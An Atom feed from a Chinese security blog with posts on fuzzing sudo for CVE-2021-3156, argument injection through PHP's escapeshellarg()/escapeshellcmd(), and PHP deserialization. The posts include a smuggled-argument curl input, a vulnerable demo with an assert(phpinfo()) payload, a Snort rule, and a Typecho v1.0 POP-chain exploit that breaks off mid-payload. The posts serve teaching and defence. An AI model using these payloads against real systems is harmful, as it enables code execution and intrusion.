<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hvnt3r&#39;s Blog</title>
  
  <subtitle>让我们来猎杀那些陷入黑暗中的人吧-Shauna Vayne</subtitle>
  <link href="https://www.hvnt3r.top/atom.xml" rel="self"/>
  
  <link href="https://www.hvnt3r.top/"/>
  <updated>2022-02-16T12:06:42.855Z</updated>
  <id>https://www.hvnt3r.top/</id>
  
  <author>
    <name>Hvnt3r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Fuzz Sudo with AFL</title>
    <link href="https://www.hvnt3r.top/2021/05/Fuzz-Sudo-with-AFL/"/>
    <id>https://www.hvnt3r.top/2021/05/Fuzz-Sudo-with-AFL/</id>
    <published>2021-05-07T13:06:50.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><strong>CVE-2021-3156</strong></p><p>使用AFLplusplus对sodu进行fuzz</p><p>首先从<a href="https://www.sudo.ws/">sudo官网</a>下载存在漏洞的sudo源码，本文采用sudo-1.9.1</p><p>了解sudo</p><blockquote><p><strong>Sudo</strong> （<strong>s</strong>ubstitute <strong>u</strong>ser [或 <strong>s</strong>uper<strong>u</strong>ser] <strong>do</strong>），是一种<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%A8%8B%E5%BC%8F">程序</a>，用于<a href="https://zh.wikipedia.org/wiki/%E9%A1%9EUnix%E7%B3%BB%E7%B5%B1">类Unix</a><a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1">操作系统</a>如<a href="https://zh.wikipedia.org/wiki/BSD">BSD</a>，<a href="https://zh.wikipedia.org/wiki/Mac_OS_X">Mac OS X</a>，以及<a href="https://zh.wikipedia.org/wiki/GNU/Linux">GNU&#x2F;Linux</a>以允许用户透过安全的方式使用特殊的权限运行程序 （通常为<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1">系统</a>的<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E7%B4%9A%E4%BD%BF%E7%94%A8%E8%80%85">超级用户</a>）。</p><p>【维基百科】</p></blockquote><p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/Fuzz-Sudo-with-AFL/image-20210507220014027.png" alt="image-20210507220014027"></p><p>由图可见sudoedit是指向sudo的链接，那sudo是如何在执行时区分当前用户运行的是sudo还是sudoedit来进入不同的执行逻辑呢？原因在下图，sudo使用getprogname获取当前</p><p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/Fuzz-Sudo-with-AFL/image-20210507220240934.png" alt="image-20210507220240934"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;CVE-2021-3156&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用AFLplusplus对sodu进行fuzz</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>一个PHP代码注入漏洞</title>
    <link href="https://www.hvnt3r.top/2021/02/%E4%B8%80%E4%B8%AAPHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.hvnt3r.top/2021/02/%E4%B8%80%E4%B8%AAPHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-09T13:12:26.000Z</published>
    <updated>2022-02-16T12:06:42.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-escapeshellarg-与escapeshellcmd"><a href="#PHP-escapeshellarg-与escapeshellcmd" class="headerlink" title="PHP escapeshellarg() 与escapeshellcmd()"></a>PHP escapeshellarg() 与escapeshellcmd()</h1><blockquote><p>最近在对某产品的漏洞进行复现与发散绕过，遇到了一个将escapeshellarg()与escapeshellcmd()一起使用导致命令执行的漏洞，因此就记录一下漏洞成因以及绕过手法。</p></blockquote><p>首先补充一下背景知识，在unix系统中，被单引号包裹的部分如果存在变量，则这个变量不会被解析，但是被双引号包裹的部分在执行时，bash会先将变量名解析为变量的值再使用。</p><span id="more"></span><p><img src="https://i.loli.net/2021/02/09/2xbfAnvMO6WZKqm.png" alt="命令示例"></p><h4 id="escapeshellarg-的定义："><a href="#escapeshellarg-的定义：" class="headerlink" title="escapeshellarg()的定义："></a>escapeshellarg()的定义：</h4><blockquote><p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数 </p><p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号) </p><p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p></blockquote><p><img src="https://i.loli.net/2021/02/09/TX8A3kLd2Zcx6z1.png" alt="转义结果"></p><p>由上图可见<code>escapeshellarg()</code>会为参数加上单引号</p><p>另外说一下与<code>escapeshellarg()</code>类似的php过滤函数<code>escapeshellcmd()</code>，以下是<code>escapeshellcmd()</code>的定义:</p><h4 id="escapeshellcmd-的定义："><a href="#escapeshellcmd-的定义：" class="headerlink" title="escapeshellcmd()的定义："></a>escapeshellcmd()的定义：</h4><blockquote><p><strong>escapeshellcmd</strong> — shell 元字符转义</p><p>功能：<strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： <em>&amp;#;&#96;|*?~&lt;&gt;^()[]{}$</em>, <em>\x0A</em> 和 <em>\xFF*。 *’</em> 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p><p><strong>定义</strong> ：<code>string escapeshellcmd ( string $command)</code></p></blockquote><p><img src="https://i.loli.net/2021/02/09/oN4uKvrc1Zs3kdW.png" alt="转义结果"></p><p>由上图可见escapeshellcmd()函数会将输入的命令中的特殊字符进行转义。</p><hr><p>以上两个函数都是PHP自带的过滤函数，这两个函数单独使用时并不会出现什么问题，但是当这两个函数结合使用时，并不会时应用变得更加安全，下面举个例子来证明一下:</p><p>假如用户传入的数据为<code>192.168.64.2 -v -d a=1</code>：</p><p><img src="https://i.loli.net/2021/02/09/fyV1s94PTiQDeJA.png" alt="漏洞示例"></p><p>可以看到<code>192.168.64.2 -v -d a=1</code>经过escapeshellarg()函数处理之后加上了单引号：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.64.2</span> -v -d a=<span class="hljs-number">1</span><br>||<br>\/<br>&#x27;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">64</span>.<span class="hljs-number">2</span> -v -d a=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>由于处理后的字符串中单引号可配对，且无满足escapeshellcmd()函数转义的其他特殊符号，所以处理后的结果不变：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;192.168.64.2 -v -d a=1&#x27;<br><span class="hljs-string">||</span><br>\/<br>&#x27;192.168.64.2 -v -d a=1&#x27;<br></code></pre></td></tr></table></figure><p>因此实际执行的命令为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> &#x27;<span class="hljs-number">192.168.64.2</span> -v -d a=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>结合上文内容，bash中被单引号包裹的变量不会被解析为值，所以<code>-v -d a=1</code>不会被解析为参数，因此没有参数逃逸的情况发生。</p><p>但是如果用户输入的数据中加入了奇数个单引号，情况就不一样了，假如用户输入数据为<code> 192.168.64.2 &#39; -v -d a=1</code>，实际的处理过程如下：</p><p>由于字符串中存在一个单引号，因此escapeshellarg()函数会转义其中的单引号并用成对的单引号将转义部分两侧的字符串连接起来：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.64.2</span> &#x27; -v -d a=<span class="hljs-number">1</span><br>          ||<br>          \/<br>&#x27;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">64</span>.<span class="hljs-number">2</span> &#x27;\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>但是经过escapeshellcmd()函数时，escapeshellcmd()将特殊字符<code>\</code>进行转义变为了<code>\\</code>，同时识别到最后一个单引号未闭合，因此也为最后一个单引号添加转义符号成为<code>\&#39;</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;192.168.64.2 &#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1&#x27;<br>          ||<br>          \/<br><span class="hljs-string">&#x27;192.168.64.2 &#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;<br></code></pre></td></tr></table></figure><p>因此经过escapeshellarg()与escapeshellcmd()函数处理之后实际执行的命令为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">curl <span class="hljs-string">&#x27;192.168.64.2 &#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;<br></code></pre></td></tr></table></figure><p>闭合的双引号部分可以省略，<code>\\</code>被bash识别为<code>\</code>，因此这个命令可简化为如下形式：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">curl <span class="hljs-string">&#x27;192.168.64.2 &#x27;</span><span class="hljs-string">\\&#x27;&#x27;</span> -v -d a=<span class="hljs-number">1</span><span class="hljs-string">\&#x27;</span><br>          ||<br>          <span class="hljs-string">\/</span><br>curl <span class="hljs-number">192.168</span>.<span class="hljs-number">64.2</span> <span class="hljs-string">\</span> -v -d a=<span class="hljs-number">1</span><span class="hljs-string">\&#x27;</span><br></code></pre></td></tr></table></figure><p>本命令即为向<code>192.168.64.2 \</code>发起请求，请求的数据为POST的a&#x3D;1，因此造成了参数逃逸。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP-escapeshellarg-与escapeshellcmd&quot;&gt;&lt;a href=&quot;#PHP-escapeshellarg-与escapeshellcmd&quot; class=&quot;headerlink&quot; title=&quot;PHP escapeshellarg() 与escapeshellcmd()&quot;&gt;&lt;/a&gt;PHP escapeshellarg() 与escapeshellcmd()&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;最近在对某产品的漏洞进行复现与发散绕过，遇到了一个将escapeshellarg()与escapeshellcmd()一起使用导致命令执行的漏洞，因此就记录一下漏洞成因以及绕过手法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先补充一下背景知识，在unix系统中，被单引号包裹的部分如果存在变量，则这个变量不会被解析，但是被双引号包裹的部分在执行时，bash会先将变量名解析为变量的值再使用。&lt;/p&gt;</summary>
    
    
    
    <category term="WEB安全" scheme="https://www.hvnt3r.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞挖掘" scheme="https://www.hvnt3r.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="PHP代码注入" scheme="https://www.hvnt3r.top/tags/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞成因、防御、绕过</title>
    <link href="https://www.hvnt3r.top/2021/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/"/>
    <id>https://www.hvnt3r.top/2021/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/</id>
    <published>2021-02-09T09:17:49.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-PHP反序列化漏洞成因"><a href="#0x01-PHP反序列化漏洞成因" class="headerlink" title="0x01 PHP反序列化漏洞成因"></a>0x01 PHP反序列化漏洞成因</h2><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><blockquote><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 –php官方文档</p></blockquote><p>serialize() ：返回带有变量类型和值的字符串</p><p>unserialize() ：想要将已序列化的字符串变回 PHP 的值</p><span id="more"></span><p>代码示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">example</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$new</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">example</span>();<br><span class="hljs-variable">$new</span>-&gt;test=<span class="hljs-string">&quot;sangfor&quot;</span>;<br><span class="hljs-variable">$ser</span> =  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>));<br><span class="hljs-meta">?&gt;</span><br><br><br>output:<br><br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;example&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;sangfor&quot;</span>;&#125;<br>example <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [test] =&gt; sangfor<br>)<br></code></pre></td></tr></table></figure><p>序列化字符串的格式为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;example&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;sangfor&quot;</span>;&#125;<br><br>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝<br></code></pre></td></tr></table></figure><p>常见的反序列化数据类型标志：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span> - 整数<br>d - 浮点数<br>O - 对象<br>R - 引用<br>S - 字符串hex<br>s - 字符串<br><span class="hljs-selector-tag">a</span> - 数组<br><span class="hljs-selector-tag">b</span> - 布尔值<br>N - NULL<br></code></pre></td></tr></table></figure><h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><p>在php中有一些函数不需要调用就可以执行，称这种为方法为魔术方法，常见的PHP魔术函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()，类的构造函数<br><span class="hljs-title function_ invoke__">__destruct</span>()，类的析构函数<br><span class="hljs-title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__get</span>()，获得一个类的成员变量时调用<br><span class="hljs-title function_ invoke__">__set</span>()，设置一个类的成员变量时调用<br><span class="hljs-title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()时调用<br><span class="hljs-title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="hljs-keyword">unset</span>()时被调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()，执行<span class="hljs-title function_ invoke__">serialize</span>()时，先会调用这个函数<br><span class="hljs-title function_ invoke__">__wakeup</span>()，执行<span class="hljs-title function_ invoke__">unserialize</span>()时，先会调用这个函数<br><span class="hljs-title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法<br><span class="hljs-title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><span class="hljs-title function_ invoke__">__set_state</span>()，调用<span class="hljs-title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。<br><span class="hljs-title function_ invoke__">__clone</span>()，当对象复制完成时调用<br><span class="hljs-title function_ invoke__">__autoload</span>()，尝试加载未定义的类<br><span class="hljs-title function_ invoke__">__debugInfo</span>()，打印所需调试信息<br></code></pre></td></tr></table></figure><h3 id="构造攻击链（POP与ROP）"><a href="#构造攻击链（POP与ROP）" class="headerlink" title="构造攻击链（POP与ROP）"></a>构造攻击链（POP与ROP）</h3><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。比如栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p><p>ROP的核心思想：攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。操作系统通过栈来进行函数的调用和返回。函数的调用和返回就是通过压栈和出栈来实现的。</p><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p><h3 id="PHP反序列化漏洞Demo与漏洞利用"><a href="#PHP反序列化漏洞Demo与漏洞利用" class="headerlink" title="PHP反序列化漏洞Demo与漏洞利用"></a>PHP反序列化漏洞Demo与漏洞利用</h3><h4 id="漏洞Demo"><a href="#漏洞Demo" class="headerlink" title="漏洞Demo"></a>漏洞Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-variable language_">$this</span>-&gt;age);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$h</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;h&#x27;</span>]);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="漏洞Poc"><a href="#漏洞Poc" class="headerlink" title="漏洞Poc"></a>漏洞Poc</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload:(适用于<span class="hljs-title function_ invoke__">destruct</span>() <span class="hljs-title function_ invoke__">wakeup</span>())<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;demo&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>通过参数h将序列化字符串传递给Demo，demo再被反序列化之后自动调用<code>__destruct()</code>魔法函数导致程序运行<code>assert(phpinfo())</code>，这一步骤用到的<code>__destruct()</code>即为攻击链的一个节点，真实环境中需要利用多个节点串联为攻击链，具体实例见下文。</p><h2 id="0x02-防御侧（snort）"><a href="#0x02-防御侧（snort）" class="headerlink" title="0x02 防御侧（snort）"></a>0x02 防御侧（snort）</h2><p>规则示例（非PHP反序列化漏洞）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rules">alert tcp $EXTERNAL_NET any -&gt; $SQL_SERVERS $ORACLE_PORTS ( msg:&quot;SERVER-ORACLE dbms_repcat.purge_master_log buffer overflow attempt&quot;; flow:to_server,established; content:&quot;dbms_repcat.purge_master_log&quot;,nocase; pcre:&quot;/((\w+)[\r\n\s]*\x3a=[\r\n\s]*(\x27[^\x27]&#123;1075,&#125;\x27|\x22[^\x22]&#123;1075,&#125;\x22)[\r\n\s]*\x3b.*gname[\r\n\s]*=&gt;[\r\n\s]*\2|gname\s*=&gt;\s*(\x27[^\x27]&#123;1075,&#125;|\x22[^\x22]&#123;1075,&#125;)|\(\s*(\x27[^\x27]*\x27|\x22[^\x22]+\x22)\s*,\s*(\x27[^\x27]&#123;1075,&#125;|\x22[^\x22]&#123;1075,&#125;))/si&quot;; metadata:ruleset community; reference:url,www.appsecinc.com/resources/alerts/oracle/2004-0001/25.html; classtype:attempted-user; sid:2792; rev:4; )<br></code></pre></td></tr></table></figure><p>规则动作举例：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">alert：使用选定的报警方法产生报警信息，并且记录数据包 <br><span class="hljs-built_in">log</span>：记录数据包 <br>pass：忽略数据包 <br><span class="hljs-built_in">activate</span>：报警，接着打开其它的dynamic规则 <br>dynamic：保持空闲状态，直到被activete规则激活，作为一条<span class="hljs-built_in">log</span>规则 <br></code></pre></td></tr></table></figure><h2 id="0x03-绕过方法"><a href="#0x03-绕过方法" class="headerlink" title="0x03 绕过方法"></a>0x03 绕过方法</h2><h3 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h3><blockquote><p> 本次漏洞环境采用Typecho v1.0反序列化漏洞</p></blockquote><p>本漏洞的产生位置为<code>install.php</code>，查看文件源码有以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title class_">Typecho_Cookie</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>)));<br>    <span class="hljs-title class_">Typecho_Cookie</span>::<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>);<br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Typecho_Db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br>    <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">addServer</span>(<span class="hljs-variable">$config</span>, <span class="hljs-title class_">Typecho_Db</span>::READ | <span class="hljs-title class_">Typecho_Db</span>::WRITE);<br>    <span class="hljs-title class_">Typecho_Db</span>::<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$db</span>);<br></code></pre></td></tr></table></figure><p>从上述代码可知两个信息：</p><p>1、GET请求的finish非空</p><p>2、__typecho_config字段中存放payload</p><p>跟进Typecho_Db类发现此类中存在一个构造函数，此构造函数中存在一个将成员与字符串进行拼接的操作，由上文中提到的魔法函数可知，此步骤可能触发<code>__toString()</code>魔法函数，因此从源码中寻找可用的包含<code>__toString()</code>的类。</p><p><img src="https://i.loli.net/2021/02/09/FcJilg6ba81TuAh.png" alt="Typecho_Db中的__construct()"></p><p>在Typecho_Feed中找到了可用的<code>__toString()</code>魔法函数</p><p><img src="https://i.loli.net/2021/02/09/hJIcTR7dmSEy2N6.png" alt="__toString()"></p><p>在这个魔法函数中找到了属性调用的代码，当目标类中不存在screenName属性时可以触发<code>__get()</code>魔法函数，下一步在源码中寻找可用的<code>__get()</code>魔法函数</p><p><img src="https://i.loli.net/2021/02/09/bvI5XzCSgfGQV4P.png" alt="__get()"></p><p>在Typecho_Request中找到了<code>__get()</code>魔法函数：</p><p><img src="https://i.loli.net/2021/02/09/bdpsjBveqYmk7F8.png" alt="__get()魔法函数"></p><p><code>__get()</code>魔法函数中调用<code>_applyFilter</code>中又可以用于命令执行的函数<code>call_user_func()</code>：</p><p><img src="https://i.loli.net/2021/02/09/uCQgS976qHm4b8L.png" alt="目标函数"></p><p>到这里一条完整的构造链就梳理出来了，完整payload如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__typecho_config<span 